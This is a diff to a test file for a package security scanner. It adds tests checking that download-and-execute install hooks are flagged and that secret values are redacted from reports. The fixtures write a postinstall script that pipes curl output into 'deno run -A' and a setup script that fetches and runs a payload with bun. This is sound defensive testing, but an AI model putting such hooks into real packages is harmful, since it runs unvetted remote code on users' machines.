@@ -40,6 +40,31 @@ describe("local deep scan", () => {
     );
   });
 
+  test("flags modern runtime download execution paths", async () => {
+    const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-modern-runtime-"));
+    await writeFile(
+      join(workspace, "package.json"),
+      JSON.stringify(
+        {
+          name: "modern-runtime-risk",
+          scripts: {
+            postinstall: "curl -fsSL https://example.com/install.ts | deno run -A -"
+          }
+        },
+        null,
+        2
+      )
+    );
+    await writeFile(join(workspace, "setup.sh"), "wget https://example.com/payload.mjs -O /tmp/payload.mjs && bun /tmp/payload.mjs\n");
+
+    const report = await deepScanProject({ path: workspace });
+
+    expect(report.findings.map((finding) => finding.category)).toEqual(
+      expect.arrayContaining(["remote-shell", "downloaded-file-execution"])
+    );
+    expect(report.summary.highCount).toBeGreaterThanOrEqual(2);
+  });
+
   test("is available through the CLI as a JSON local-only report", async () => {
     const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-cli-"));
     await mkdir(join(workspace, "src"));
@@ -134,6 +159,27 @@ describe("local deep scan", () => {
     expect(report.findings.map((finding) => finding.category)).toEqual(
       expect.arrayContaining(["npm-lifecycle-script", "credential-access", "artifact-scan-limit"])
     );
+  });
+
+  test("redacts secret values from finding evidence", async () => {
+    const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-redact-"));
+    await writeFile(
+      join(workspace, "config.yaml"),
+      [
+        "OPENAI_API_KEY=sk-testsecretvalue1234567890",
+        "BASE_PRIVATE_KEY=0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "token: ghp_testsecretvalue1234567890"
+      ].join("\n")
+    );
+
+    const report = await deepScanProject({ path: workspace });
+    const serialized = JSON.stringify(report);
+
+    expect(report.findings.map((finding) => finding.category)).toContain("credential-access");
+    expect(serialized).toContain("<redacted");
+    expect(serialized).not.toContain("sk-testsecretvalue1234567890");
+    expect(serialized).not.toContain("ghp_testsecretvalue1234567890");
+    expect(serialized).not.toContain("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
   });
 });
 
